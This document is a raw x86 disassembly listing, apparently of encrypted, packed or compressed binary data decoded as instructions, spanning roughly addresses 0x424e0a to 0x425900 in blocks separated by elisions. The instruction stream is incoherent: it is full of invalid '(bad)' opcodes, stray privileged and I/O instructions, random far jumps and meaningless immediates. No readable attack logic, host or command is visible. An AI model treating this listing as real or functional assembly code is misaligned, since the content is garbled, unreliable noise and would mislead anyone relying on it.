  424e0a:	jae    0x424e0a
  424e0c:	xor    cl,BYTE PTR [ebx+0xdf816e]
	...
  424e72:	add    BYTE PTR [eax],al
  424e74:	cmp    eax,0xf361d20c
  424e79:	(bad)  
  424e7a:	mov    edi,0x4bceee5c
  424e7f:	jns    0x424e9d
  424e81:	jmp    0x8aa809c1
  424e86:	add    DWORD PTR [eax],eax
  424e88:	add    eax,0xc0000001
  424e8d:	call   0xf3e7:0xbab64ca8
  424e94:	loope  0x424e3e
  424e96:	xlat   BYTE PTR ds:[ebx]
  424e97:	pop    ss
  424e98:	jl     0x424f0d
  424e9a:	and    esp,DWORD PTR [eax+0x33]
  424e9d:	aam    0x87
  424e9f:	mov    bl,0xd1
  424ea1:	jmp    DWORD PTR [edi-0x18]
  424ea4:	imul   ecx,DWORD PTR [ebp+0x2e4bbc91],0xb3eddae
  424eae:	inc    edx
  424eaf:	xchg   ebx,eax
  424eb0:	ins    BYTE PTR es:[edi],dx
  424eb1:	nop
  424eb2:	ins    BYTE PTR es:[edi],dx
  424eb3:	das    
  424eb4:	mov    ds:0x57817f0c,eax
  424eb9:	xor    al,0x7c
  424ebb:	xchg   edx,eax
  424ebc:	div    BYTE PTR [esi]
  424ebe:	cmp    al,0x6
  424ec0:	xchg   edi,eax
  424ec1:	or     eax,0x9835d12a
  424ec6:	inc    eax
  424ec7:	adc    bl,BYTE PTR [ecx+0x668a73f3]
  424ecd:	push   ebx
  424ece:	mov    eax,0x714921c3
  424ed3:	mov    DWORD PTR [ecx],esi
  424ed5:	js     0x424e83
  424ed7:	mov    ah,0xcc
  424ed9:	jl     0x424efa
  424edb:	adc    bl,0x3f
  424ede:	xchg   ecx,eax
  424edf:	inc    esp
  424ee0:	pop    ss
  424ee1:	into   
  424ee2:	popf   
  424ee3:	sbb    al,dl
  424ee5:	dec    esp
  424ee6:	fld    QWORD PTR [ecx]
  424ee8:	jno    0x424f41
  424eea:	mov    dh,0xe6
  424eec:	in     al,dx
  424eed:	loope  0x424f0a
  424eef:	mov    ds:0xa95b7fe6,eax
  424ef4:	retf   0xdda7
  424ef7:	push   ss
  424ef8:	xor    eax,0x13739624
  424efd:	adc    eax,0xf5c2fdc6
  424f02:	push   eax
  424f03:	pop    esp
  424f04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424f05:	pop    edi
  424f06:	clc    
  424f07:	jns    0x424ea2
  424f09:	stc    
  424f0a:	retf   0xabe5
  424f0d:	stc    
  424f0e:	stos   BYTE PTR es:[edi],al
  424f0f:	lds    ecx,FWORD PTR [ebx-0x13a1bdcc]
  424f15:	fs ret 0xbe65
  424f19:	fnstsw WORD PTR [eax]
  424f1b:	mov    edx,0x15287bce
  424f20:	inc    DWORD PTR [edx+0x7c]
  424f23:	sub    BYTE PTR [esi-0x4c6157e],ch
  424f29:	add    al,0x5a
  424f2b:	icebp  
  424f2c:	pop    ds
  424f2d:	jne    0x424f45
  424f2f:	push   esi
  424f30:	mov    bl,0xef
  424f32:	loope  0x424ecb
  424f34:	stc    
  424f35:	daa    
  424f36:	push   eax
  424f37:	adc    al,0x5d
  424f39:	mov    esi,0x772d3798
  424f3e:	aam    0x62
  424f40:	push   edx
  424f41:	(bad)  
  424f43:	mov    bl,0xc4
  424f45:	inc    esi
  424f46:	and    eax,0x13483a5f
  424f4b:	and    DWORD PTR gs:[esi+0x69],ebp
  424f4f:	popf   
  424f50:	mov    ds:0x66523c6b,eax
  424f55:	or     BYTE PTR [ebp+0x18fed412],0x2c
  424f5c:	cmp    DWORD PTR [ebp+0x3eb84b51],0xffffffa8
  424f63:	push   edi
  424f64:	xor    al,0x32
  424f66:	add    bl,BYTE PTR [ebx]
  424f68:	add    bl,ch
  424f6a:	(bad)  
  424f6b:	push   ds
  424f6c:	popf   
  424f6d:	mov    cl,0xe9
  424f6f:	push   ebp
  424f70:	inc    ecx
  424f71:	mov    esp,0x3aa4d8bc
  424f76:	or     BYTE PTR [esi],bl
  424f78:	ret    0x535a
  424f7b:	inc    eax
  424f7c:	repnz aaa 
  424f7e:	push   edi
  424f7f:	popa   
  424f80:	pop    ebx
  424f81:	fadd   QWORD PTR [ecx]
  424f83:	inc    ebp
  424f84:	test   al,0x68
  424f86:	cmp    DWORD PTR [edx],edi
  424f88:	jle    0x424f86
  424f8a:	dec    esi
  424f8b:	jmp    0x2b:0x81b02ce5
	...
  424ff2:	add    BYTE PTR [eax],al
  424ff4:	dec    ebx
  424ff5:	push   ss
  424ff6:	int    0x41
  424ff8:	fstp   st(3)
  424ffa:	iret   
  424ffb:	push   ds
  424ffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ffd:	fadd   st(3),st
  424fff:	dec    eax
  425000:	mov    al,ds:0x6a83e175
  425005:	mov    eax,DWORD PTR [ecx]
  425007:	add    BYTE PTR ds:0xbd000001,al
  42500d:	push   esp
  42500e:	pop    es
  42500f:	xor    bh,dh
  425011:	jns    0x424fed
  425013:	xor    edi,DWORD PTR [edi+eiz*1-0x53]
  425017:	scas   al,BYTE PTR es:[edi]
  425018:	sub    al,BYTE PTR [eax+eiz*2+0x47130839]
  42501f:	xor    al,0xe
  425021:	cli    
  425022:	mov    ah,0x51
  425024:	addr16 jp 0x424fe5
  425027:	cmc    
  425028:	xor    al,0xa9
  42502a:	out    0xe3,al
  42502c:	sbb    DWORD PTR [ebp-0x1445e418],edx
  425032:	(bad)  
  425034:	sub    eax,0x885e262c
  425039:	xor    ebp,0xe33f5240
  42503f:	jo     0x4250b0
  425041:	and    DWORD PTR [eax+ebp*4],0x3b9f6c5e
  425048:	loopne 0x42502a
  42504a:	scas   al,BYTE PTR es:[edi]
  42504b:	inc    edi
  42504c:	xchg   ecx,eax
  42504d:	pop    eax
  42504e:	mov    edi,0xf5b1297c
  425053:	or     eax,0x6b539b97
  425058:	adc    eax,0xa0663373
  42505d:	out    0x89,al
  42505f:	mov    ds:0xfab1f46d,eax
  425064:	sbb    BYTE PTR [edi+0x4d],ch
  425067:	push   esp
  425068:	(bad)  
  425069:	mov    esi,0xcfaa01a7
  42506e:	cmp    DWORD PTR ds:0x81b216c,esi
  425074:	shr    DWORD PTR [esi+0x59],cl
  425077:	mov    esp,ss
  425079:	hlt    
  42507a:	mov    dl,0x8c
  42507c:	les    ecx,FWORD PTR [ebp-0x6d6c1b62]
  425082:	dec    esp
  425083:	xchg   edx,eax
  425084:	mov    dl,ch
  425086:	gs ret 0xef06
  42508a:	and    ebx,ecx
  42508c:	and    al,BYTE PTR [eax]
  42508e:	loopne 0x4250b3
  425090:	loop   0x4250c9
  425092:	retf   
  425093:	sub    DWORD PTR [eax],eax
  425095:	loope  0x425107
  425097:	imul   ecx,ebx,0x85dc06bd
  42509d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42509e:	cmp    eax,0x1433dd13
  4250a3:	jle    0x425124
  4250a5:	push   0xbdfe2d06
  4250aa:	ins    DWORD PTR es:[edi],dx
  4250ab:	or     DWORD PTR [ebp+ecx*2+0x6],esi
  4250af:	cmc    
  4250b0:	lods   eax,DWORD PTR ds:[esi]
  4250b1:	mov    ebx,DWORD PTR [eax+0x3cfa4019]
  4250b7:	and    esp,edi
  4250b9:	cmp    al,0x40
  4250bb:	xchg   edi,eax
  4250bc:	(bad)  [ebp-0x5ae26cc]
  4250c2:	mov    ds:0xb7b09c83,al
  4250c7:	xchg   ecx,eax
  4250c8:	sbb    al,0xad
  4250ca:	add    DWORD PTR [edx+ebx*2+0x3816a5e5],edx
  4250d1:	push   ebp
  4250d2:	out    dx,eax
  4250d3:	push   esp
  4250d4:	(bad)  [edx+0x3f]
  4250d7:	push   cs
  4250d8:	stos   BYTE PTR es:[edi],al
  4250d9:	retf   0x3a02
  4250dc:	add    eax,0xfc5ffcd2
  4250e1:	mov    ds:0xf5108bc4,al
  4250e6:	(bad)  
  4250e7:	ds std 
  4250e9:	inc    ebp
  4250ea:	iret   
  4250eb:	cmp    bl,BYTE PTR [ecx-0x6e]
  4250ee:	aad    0x22
  4250f0:	push   cs
  4250f1:	ins    BYTE PTR es:[edi],dx
  4250f2:	xchg   esp,eax
  4250f3:	stos   BYTE PTR es:[edi],al
  4250f4:	sbb    BYTE PTR [esi],ah
  4250f6:	imul   esp,DWORD PTR [ebx],0x7b
  4250f9:	jge    0x425081
  4250fb:	imul   ebx,eax,0xad473e45
  425101:	scas   al,BYTE PTR es:[edi]
  425102:	fwait
  425103:	xor    DWORD PTR [esi+edi*1-0x709958b],eax
  42510a:	mov    ecx,0xd4b383cb
  42510f:	fwait
  425110:	dec    esp
	...
  425171:	add    BYTE PTR [eax],al
  425173:	add    dh,bl
  425175:	adc    DWORD PTR [edi-0x15020dd],ebx
  42517b:	std    
  42517c:	out    dx,al
  42517d:	jmp    0xb74a:0x6d792e8
  425184:	outs   dx,DWORD PTR ds:[esi]
  425185:	mov    WORD PTR [ecx],es
  425187:	add    BYTE PTR ds:0xe4000001,al
  42518d:	push   0x23
  42518f:	xchg   esp,eax
  425190:	jne    0x42515b
  425192:	dec    edi
  425193:	(bad)  
  425194:	mov    DWORD PTR [ebp+ecx*8+0x29262f4a],esp
  42519b:	xlat   BYTE PTR ds:[ebx]
  42519c:	mov    WORD PTR [esi-0x2c],gs
  42519f:	mov    bl,cl
  4251a1:	out    0xa0,eax
  4251a3:	fcom   DWORD PTR [ecx+0x1d]
  4251a6:	cdq    
  4251a7:	std    
  4251a8:	enter  0xaf56,0x2b
  4251ac:	add    eax,0x178f0dd5
  4251b1:	mov    edi,0xd32c1f40
  4251b6:	pop    eax
  4251b7:	cld    
  4251b8:	lds    ebp,FWORD PTR [ebx+0x71223c6c]
  4251be:	rol    BYTE PTR [eax],1
  4251c0:	les    ebp,FWORD PTR [ebp+0x60f134be]
  4251c6:	pusha  
  4251c7:	add    al,al
  4251c9:	sub    ecx,DWORD PTR [edx-0x351eb49c]
  4251cf:	inc    esp
  4251d0:	stos   DWORD PTR es:[edi],eax
  4251d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4251d2:	pop    esp
  4251d3:	jnp    0x425196
  4251d5:	outs   dx,BYTE PTR ds:[esi]
  4251d6:	in     al,dx
  4251d7:	sub    esp,esp
  4251d9:	pushf  
  4251da:	aas    
  4251db:	leave  
  4251dc:	call   0x21d6:0x5556d6af
  4251e3:	cdq    
  4251e4:	stos   BYTE PTR es:[edi],al
  4251e5:	iret   
  4251e6:	fisttp QWORD PTR [esi+ebp*4-0x74]
  4251ea:	add    DWORD PTR [edi],ebx
  4251ec:	inc    ebp
  4251ed:	push   edx
  4251ee:	ins    DWORD PTR es:[edi],dx
  4251ef:	les    ebp,FWORD PTR [eax-0x3e989e7f]
  4251f5:	dec    ecx
  4251f6:	call   0x39f6:0x1e49514f
  4251fd:	js     0x42518c
  4251ff:	and    al,0x8d
  425201:	ret    
  425202:	inc    eax
  425203:	ja     0x425200
  425205:	emms   
  425207:	lea    edx,[edx]
  425209:	ret    0xa212
  42520c:	shr    DWORD PTR [edx],cl
  42520e:	aas    
  42520f:	jbe    0x42521f
  425211:	das    
  425212:	sbb    dh,bh
  425214:	xchg   BYTE PTR [eax-0x5c115b60],bl
  42521a:	out    dx,al
  42521b:	cmc    
  42521c:	leave  
  42521d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42521e:	popa   
  42521f:	loop   0x42527d
  425221:	mov    bh,0xfa
  425223:	inc    eax
  425224:	mov    al,0x56
  425226:	repnz mov dh,0xff
  425229:	shl    DWORD PTR [ecx+0x6e],0xc
  42522d:	fisubr DWORD PTR [eax-0x5e]
  425230:	aam    0xfb
  425232:	aas    
  425233:	enter  0xdff4,0x37
  425237:	jl     0x4251cc
  425239:	sub    DWORD PTR [eax-0x63],0xffffffba
  42523d:	dec    ebp
  42523e:	loop   0x4251fa
  425240:	int3   
  425241:	xor    DWORD PTR [edi-0x246402b4],edi
  425247:	fs popf 
  425249:	test   eax,0xe573391f
  42524e:	inc    edx
  42524f:	dec    eax
  425250:	imul   ebp,DWORD PTR ds:0xa97845f8,0xffffff84
  425257:	rol    BYTE PTR [esi-0xd],cl
  42525a:	cmp    BYTE PTR [esi-0x8498750],ch
  425260:	adc    edx,esi
  425262:	test   al,0xd5
  425264:	cs jge 0x425238
  425267:	call   0x32b4:0xe89aa85a
  42526e:	in     al,dx
  42526f:	sbb    eax,0x1f89954d
  425274:	test   al,0x14
  425276:	(bad)  
  425277:	scas   eax,DWORD PTR es:[edi]
  425278:	mov    dh,0x6b
  42527a:	dec    edi
  42527b:	xchg   DWORD PTR [ebx],ebx
  42527d:	repnz fwait
  42527f:	loop   0x425256
  425281:	push   ebp
  425282:	push   es
  425283:	mov    bl,BYTE PTR [eax]
  425285:	fcom   QWORD PTR [ecx]
  425287:	jmp    0x9010:0xa1d03291
  42528e:	imul   esi,DWORD PTR [ebx],0xf
	...
  4252f1:	add    BYTE PTR [eax],al
  4252f3:	add    BYTE PTR [esp+eax*8-0x84318d],ch
  4252fa:	mov    ebp,0x45495ee6
  4252ff:	icebp  
  425300:	mov    ebp,0x74e4afb1
  425305:	lea    eax,[ecx]
  425307:	add    BYTE PTR ds:0xfc000001,al
  42530d:	push   0x18674d4c
  425312:	sub    BYTE PTR [esi],al
  425314:	lahf   
  425315:	sub    BYTE PTR [ebx],bh
  425317:	cs aam 0x7a
  42531a:	(bad)  
  42531b:	loopne 0x425370
  42531d:	ins    BYTE PTR es:[edi],dx
  42531e:	scas   al,BYTE PTR es:[edi]
  42531f:	sbb    al,0xe9
  425321:	lea    edi,[edi]
  425323:	in     eax,0x69
  425325:	adc    ebx,ebx
  425327:	into   
  425328:	ss aad 0xea
  42532b:	cmc    
  42532c:	cmp    DWORD PTR gs:[eax-0x68],esi
  425330:	pusha  
  425331:	call   0x4eb9e709
  425336:	sahf   
  425337:	fsubp  st(6),st
  425339:	mov    WORD PTR [ebx-0x75],?
  42533c:	dec    esp
  42533d:	in     al,0x7b
  42533f:	lds    esi,FWORD PTR [edx+0x67ddc523]
  425345:	jbe    0x425348
  425347:	pop    edi
  425348:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425349:	in     eax,0xe4
  42534b:	aaa    
  42534c:	jle    0x425301
  42534e:	sbb    DWORD PTR [edi-0x26],0x251b2be
  425355:	add    ebp,DWORD PTR [edi+0xffb1884]
  42535b:	ret    0xd0ec
  42535e:	test   BYTE PTR [ebx],dh
  425360:	sub    dl,BYTE PTR [edx+edi*8-0x2426d4b]
  425367:	sahf   
  425368:	xchg   DWORD PTR [esi],ebx
  42536a:	push   0x8c3c2ae4
  42536f:	das    
  425370:	fisubr WORD PTR [edi+0x6d22e384]
  425376:	cmc    
  425377:	sbb    eax,0xf7671b90
  42537c:	out    dx,al
  42537d:	adc    eax,0xfcbf0b11
  425382:	add    BYTE PTR [ecx],bl
  425384:	fbld   TBYTE PTR [ecx]
  425386:	aad    0x23
  425388:	fist   DWORD PTR [esi-0x1d]
  42538b:	push   esp
  42538c:	aas    
  42538d:	pop    eax
  42538e:	aam    0xff
  425390:	out    0x23,eax
  425392:	and    DWORD PTR [ebp-0x5ccef367],0x8a0237f7
  42539c:	out    dx,al
  42539d:	dec    eax
  42539e:	pop    esi
  42539f:	jp     0x4253ca
  4253a1:	sahf   
  4253a2:	data16 xor ah,BYTE PTR [esi]
  4253a5:	mov    ah,0xbe
  4253a7:	adc    ch,bl
  4253a9:	lds    eax,FWORD PTR [eax+0x54]
  4253ac:	out    dx,al
  4253ad:	popf   
  4253ae:	jmp    0x4253e4
  4253b0:	in     al,0x31
  4253b2:	rcr    ah,1
  4253b4:	(bad)  
  4253b5:	jp     0x4253ba
  4253b7:	jp     0x425379
  4253b9:	mov    ebp,0x159db17f
  4253be:	test   BYTE PTR [ecx],dh
  4253c0:	push   ebp
  4253c1:	mov    ds:0x5b65ae4,al
  4253c6:	jb     0x42542a
  4253c8:	aam    0xac
  4253ca:	aam    0x2d
  4253cc:	mov    edx,0x8eaadc6
  4253d1:	mov    bl,0x1
  4253d3:	xor    bh,BYTE PTR [esp+ecx*2]
  4253d6:	jo     0x4253d8
  4253d8:	push   ebx
  4253d9:	sub    eax,DWORD PTR [edx+0x7863da9e]
  4253df:	jmp    0xccce5133
  4253e4:	loope  0x425465
  4253e6:	aas    
  4253e7:	mov    DWORD PTR [ebx+0x1f],edi
  4253ea:	pusha  
  4253eb:	imul   ebx,eax,0x4d
  4253ee:	das    
  4253ef:	call   0x906:0x49ceda93
  4253f6:	pop    ecx
  4253f7:	xchg   esp,eax
  4253f8:	cmp    eax,0xdf434d3a
  4253fd:	mov    eax,0xfe295dc7
  425402:	pop    ecx
  425403:	aas    
  425404:	inc    ecx
  425405:	retf   
  425406:	add    eax,0x9abee98a
  42540b:	push   esi
  42540c:	xchg   BYTE PTR [eax+0x24b0f],bh
	...
  425472:	add    BYTE PTR [eax],al
  425474:	inc    edx
  425475:	or     esp,eax
  425477:	test   eax,0xeb6fedcf
  42547c:	fcomp  DWORD PTR [edx]
  42547f:	add    esp,DWORD PTR [ecx]
  425481:	fsub   st,st(2)
  425483:	or     edi,DWORD PTR [ecx-0x72]
  425486:	add    DWORD PTR [eax],eax
  425488:	add    eax,0xdd000001
  42548d:	adc    DWORD PTR [ebx+edi*2-0x4c5b0d96],esi
  425494:	out    0x13,al
  425496:	xor    BYTE PTR [edx+esi*4-0x45],dl
  42549a:	imul   eax,DWORD PTR [ecx+0xca74473],0xd52e108d
  4254a4:	ror    ch,cl
  4254a6:	aas    
  4254a7:	push   ebp
  4254a8:	das    
  4254a9:	adc    BYTE PTR [edi],bh
  4254ab:	sub    al,0xe7
  4254ad:	gs (bad) 
  4254af:	(bad)  
  4254b1:	(bad)  
  4254b3:	popa   
  4254b4:	outs   dx,BYTE PTR ds:[esi]
  4254b5:	add    eax,0xc48b913e
  4254ba:	xchg   ch,dh
  4254bc:	in     al,0xa5
  4254be:	mov    bl,BYTE PTR [edi+esi*8-0x1a998141]
  4254c5:	sub    eax,0x4ca11d9d
  4254ca:	cmp    eax,DWORD PTR [eax]
  4254cc:	push   cs
  4254cd:	sub    BYTE PTR [eax-0x3c],dl
  4254d0:	test   BYTE PTR [eax+ebx*4],ch
  4254d3:	lea    esi,[ebp+ebx*2-0x511b5fda]
  4254da:	iret   
  4254db:	out    dx,al
  4254dc:	and    dl,bh
  4254de:	sbb    DWORD PTR [edx+0x1d],ebx
  4254e1:	push   cs
  4254e2:	dec    esi
  4254e3:	pusha  
  4254e4:	pop    edx
  4254e5:	test   eax,0xb6d8adf7
  4254ea:	cmp    ebx,ebx
  4254ec:	ja     0x4254ae
  4254ee:	xlat   BYTE PTR ds:[ebx]
  4254ef:	cs sbb eax,0x9e65f74d
  4254f5:	mov    esi,0xa736f8f7
  4254fa:	ss and ah,bh
  4254fd:	test   al,0x46
  4254ff:	and    ebp,edx
  425501:	ret    
  425502:	push   edi
  425503:	cdq    
  425504:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425505:	ds out 0x14,eax
  425508:	mov    ebx,esp
  42550a:	xor    DWORD PTR [ebx+0x5043c4f],ebp
  425510:	jne    0x4254f3
  425512:	and    dh,BYTE PTR [eax]
  425514:	mov    edi,0x84e1e8c7
  425519:	add    al,0x88
  42551b:	ins    DWORD PTR es:[edi],dx
  42551c:	or     edi,DWORD PTR ds:0xc79306d4
  425522:	push   eax
  425523:	jl     0x42552b
  425525:	repz loop 0x425566
  425528:	jg     0x4254aa
  42552a:	pusha  
  42552b:	jbe    0x425565
  42552d:	xor    BYTE PTR ds:0x1a85ff45,dh
  425533:	cmp    ch,al
  425535:	pop    ds
  425536:	adc    DWORD PTR [edx],ebx
  425538:	bound  eax,QWORD PTR [eax-0x7]
  42553b:	dec    edx
  42553c:	xchg   ebx,eax
  42553d:	sbb    eax,0x4b6d8498
  425542:	mov    eax,0x4ffe7015
  425547:	pop    ebx
  425548:	xchg   DWORD PTR [eax+0x383add1a],edx
  42554e:	jmp    0x3f2b5696
  425553:	fmul   DWORD PTR [eax+0x16]
  425556:	jne    0x425590
  425558:	les    ebx,FWORD PTR [edi+eiz*4-0x9fada50]
  42555f:	dec    esi
  425560:	jae    0x4255d2
  425562:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425563:	xchg   ebx,eax
  425564:	data16 jl 0x425514
  425567:	push   esp
  425568:	test   DWORD PTR [esi+0x286fbf06],ecx
  42556e:	stos   BYTE PTR es:[edi],al
  42556f:	(bad)  
  425570:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425571:	leave  
  425572:	in     al,0x49
  425574:	in     eax,0x14
  425576:	push   ebx
  425577:	fprem  
  425579:	pop    esi
  42557a:	adc    BYTE PTR [edx-0x3f],0x96
  42557e:	aaa    
  42557f:	int3   
  425580:	jns    0x425514
  425582:	xor    eax,ebx
  425584:	cmp    ebp,DWORD PTR [esi+0x6ad4312e]
  42558a:	rcr    dh,0x89
  42558d:	or     cl,BYTE PTR [ebx]
  42558f:	jmp    0x42554c
	...
  4255f1:	add    BYTE PTR [eax],al
  4255f3:	add    ah,al
  4255f5:	jmp    0xfef4:0xfe6e7a4e
  4255fc:	dec    ebp
  4255fd:	mov    esi,0x29a0f13a
  425602:	jnp    0x42561d
  425604:	jle    0x425595
  425606:	add    DWORD PTR [eax],eax
  425608:	add    eax,0x6a000001
  42560d:	hlt    
  42560e:	pop    esi
  42560f:	cld    
  425610:	loopne 0x4255a2
  425612:	pushf  
  425613:	and    eax,DWORD PTR [ebp-0x1080b1b1]
  425619:	loopne 0x425651
  42561b:	cmc    
  42561c:	or     ah,bh
  42561e:	jbe    0x425643
  425620:	mov    ds:0x7a166416,al
  425625:	test   eax,0x9a823e4f
  42562a:	pop    DWORD PTR [edi+ebx*1+0x15]
  42562e:	(bad)  
  425630:	fmul   DWORD PTR [esi+0x10ad86b0]
  425636:	lods   eax,DWORD PTR ds:[esi]
  425637:	add    dh,dl
  425639:	xchg   esp,eax
  42563a:	cmp    DWORD PTR [edi+0x39],ebp
  42563d:	out    0xf1,eax
  42563f:	sbb    esp,DWORD PTR [eax+0x330d0963]
  425645:	cmp    DWORD PTR [edi+0x4769a1d9],esp
  42564b:	and    eax,0xd35d9b09
  425650:	sub    BYTE PTR [eax],bh
  425652:	jne    0x425611
  425654:	(bad)  
  425655:	aam    0xb5
  425657:	mov    ch,0xad
  425659:	fs cmp ebx,0x66
  42565d:	push   eax
  42565e:	add    ah,BYTE PTR [ecx-0x28c89163]
  425664:	xchg   ecx,eax
  425665:	dec    ebp
  425666:	loope  0x42565e
  425668:	call   DWORD PTR [edi-0x5e]
  42566b:	aad    0xd8
  42566d:	pop    eax
  42566e:	mov    DWORD PTR [edx-0x1253b922],ebp
  425674:	ja     0x42567f
  425676:	out    dx,eax
  425677:	(bad)  
  425678:	in     al,dx
  425679:	popa   
  42567a:	pusha  
  42567b:	rcr    BYTE PTR [eax],cl
  42567d:	jno    0x425666
  42567f:	(bad)  
  425680:	test   eax,0xb1ed6c23
  425685:	xchg   DWORD PTR [ecx+0x2f],esi
  425688:	or     BYTE PTR [ebx],dh
  42568a:	lahf   
  42568b:	mov    ecx,0x3fdcff72
  425690:	inc    edx
  425691:	popf   
  425692:	dec    eax
  425693:	fmul   DWORD PTR ds:0xb7312cd
  425699:	jns    0x4256d6
  42569b:	in     eax,0x29
  42569d:	fstp   QWORD PTR [edx-0x7392101b]
  4256a3:	mov    eax,0x40687ba9
  4256a8:	mov    edi,0x2454f22f
  4256ad:	add    BYTE PTR [edx],bh
  4256af:	scas   al,BYTE PTR es:[edi]
  4256b0:	add    eax,0x69cc2e75
  4256b5:	adc    eax,0xe5147e68
  4256ba:	inc    ebp
  4256bb:	push   ds
  4256bc:	mov    BYTE PTR [ebp-0x1d],ch
  4256bf:	daa    
  4256c0:	hlt    
  4256c1:	iret   
  4256c2:	mov    esi,0xae0f30d9
  4256c7:	xchg   esp,eax
  4256c8:	sbb    eax,DWORD PTR [esi+0x108c515e]
  4256ce:	dec    ebx
  4256cf:	shl    DWORD PTR [ebx-0x4f],0xf4
  4256d3:	adc    DWORD PTR [ebp-0x2c9b4e0a],edx
  4256d9:	add    BYTE PTR [edx-0x55],bh
  4256dc:	inc    esi
  4256dd:	or     eax,0x12e3a809
  4256e2:	cdq    
  4256e3:	jp     0x4256db
  4256e5:	pop    ds
  4256e6:	pusha  
  4256e7:	add    ah,dl
  4256e9:	mov    BYTE PTR [eax-0x16],bl
  4256ec:	sar    DWORD PTR [esi],cl
  4256ee:	push   ss
  4256ef:	pop    ebx
  4256f0:	add    eax,0x48db40f3
  4256f5:	fwait
  4256f6:	outs   dx,DWORD PTR ds:[esi]
  4256f7:	xchg   ebx,eax
  4256f8:	clc    
  4256f9:	pop    ebx
  4256fa:	sar    al,1
  4256fc:	retf   
  4256fd:	dec    ebp
  4256fe:	push   edi
  4256ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425700:	mov    ebx,0xcdc82d41
  425705:	sbb    BYTE PTR [ebp+0x43be1dc4],bl
  42570b:	jns    0x4256ce
  42570d:	scas   al,BYTE PTR es:[edi]
  42570e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42570f:	fmul   st,st(2)
	...
  425771:	add    BYTE PTR [eax],al
  425773:	add    dh,dl
  425775:	aaa    
  425776:	shl    BYTE PTR [ebx+esi*8],cl
  425779:	cmc    
  42577a:	div    bh
  42577c:	test   DWORD PTR [edi+0x3f],0x9a608574
  425783:	bound  eax,QWORD PTR [ebx+0x5000190]
  425789:	add    DWORD PTR [eax],eax
  42578b:	add    BYTE PTR [edi+eax*2+0x61],ah
  42578f:	out    0x5e,al
  425791:	js     0x42577a
  425793:	xchg   esp,eax
  425794:	jle    0x4257f5
  425796:	jmp    FWORD PTR cs:[edi-0x556bf347]
  42579d:	scas   al,BYTE PTR es:[edi]
  42579e:	sbb    esi,esp
  4257a0:	nop
  4257a1:	or     al,0xd8
  4257a3:	cld    
  4257a4:	imul   ebp,DWORD PTR [ebp-0x67e7c6fc],0x8cafeb19
  4257ae:	int3   
  4257af:	cmp    eax,0xbd9dfe0a
  4257b4:	outs   dx,DWORD PTR es:[esi]
  4257b6:	in     eax,0x60
  4257b8:	test   edx,eax
  4257ba:	(bad)  
  4257bb:	aad    0x96
  4257bd:	dec    edx
  4257be:	push   cs
  4257bf:	rcr    BYTE PTR [ecx-0x54],cl
  4257c2:	lds    eax,FWORD PTR [edi+0x4ed96b82]
  4257c8:	sbb    ch,BYTE PTR [ebx+0x1a]
  4257cb:	or     bl,bh
  4257cd:	leave  
  4257ce:	cmp    al,0x70
  4257d0:	cmp    al,0xec
  4257d2:	dec    edx
  4257d3:	push   es
  4257d4:	cmc    
  4257d5:	push   0x49b75aa0
  4257da:	scas   eax,DWORD PTR es:[edi]
  4257db:	xchg   bl,dl
  4257dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4257de:	enter  0x41e9,0x97
  4257e2:	mov    edx,0x66e1bc85
  4257e7:	push   0x89c99cce
  4257ec:	nop
  4257ed:	jne    0x4257f3
  4257ef:	test   BYTE PTR [ecx+0x30],bh
  4257f2:	shr    DWORD PTR [edx],1
  4257f4:	xor    esp,DWORD PTR [ecx+0x69]
  4257f7:	push   eax
  4257f8:	pop    esi
  4257f9:	int    0x97
  4257fb:	and    dl,BYTE PTR [ecx+0x17]
  4257fe:	push   ecx
  4257ff:	xchg   edx,eax
  425800:	dec    ecx
  425801:	add    ch,0x10
  425804:	dec    ebx
  425805:	mov    DWORD PTR [ebp+0x44],ecx
  425808:	cmp    BYTE PTR [esi+0x151623e5],bl
  42580e:	bound  ebx,QWORD PTR [eax+esi*8+0x37eae957]
  425815:	push   esp
  425816:	dec    esp
  425817:	enter  0xd9ac,0xcf
  42581b:	mov    edx,DWORD PTR [ebp+0x54]
  42581e:	cmp    bh,BYTE PTR [ecx-0x74ad878b]
  425824:	mov    ds:0x4b52f72a,al
  425829:	(bad)  
  42582a:	in     al,0xf0
  42582c:	dec    ebp
  42582d:	or     eax,0xb028180c
  425832:	or     al,0x78
  425834:	inc    ecx
  425835:	or     ecx,DWORD PTR [ebx+0x37c748a]
  42583b:	mov    ebp,0xd19d65f7
  425840:	fsubr  QWORD PTR [eax-0x4c4a2d91]
  425846:	fnstcw WORD PTR [ecx]
  425848:	idiv   esi
  42584a:	call   DWORD PTR [edi-0x5]
  42584d:	dec    esi
  42584e:	pusha  
  42584f:	add    ch,ch
  425851:	cli    
  425852:	ss sbb eax,0xce31e156
  425858:	xchg   edx,eax
  425859:	arpl   WORD PTR [eax-0x56],si
  42585c:	mov    eax,0x69b35fc9
  425861:	pop    ss
  425862:	dec    eax
  425863:	loop   0x425808
  425865:	rcl    edi,0xb5
  425868:	xchg   esp,eax
  425869:	sbb    cl,al
  42586b:	inc    esi
  42586c:	sbb    BYTE PTR [edi-0x26ec73fd],cl
  425872:	pop    ss
  425873:	jecxz  0x425893
  425875:	xchg   ebp,eax
  425876:	mov    edi,0xed5c9cd9
  42587b:	push   ecx
  42587c:	out    dx,al
  42587d:	push   0xffffffd8
  42587f:	push   esi
  425880:	in     eax,0x39
  425882:	ja     0x42581c
  425884:	lods   al,BYTE PTR ds:[esi]
  425885:	repz mov bh,0xb7
  425888:	rcl    DWORD PTR ds:0x6a875f32,1
  42588e:	pop    ebp
  42588f:	fsubr  DWORD PTR [ecx]
	...
  4258f1:	add    BYTE PTR [eax],al
  4258f3:	add    BYTE PTR [edx+edx*2-0x70],bl
  4258f7:	push   edx
  4258f8:	sahf   
  4258f9:	rcr    dh,cl
  4258fb:	pop    esi
  4258fc:	adc    BYTE PTR [edx+0x55],0x71
  425900:	retf   0xf7f3
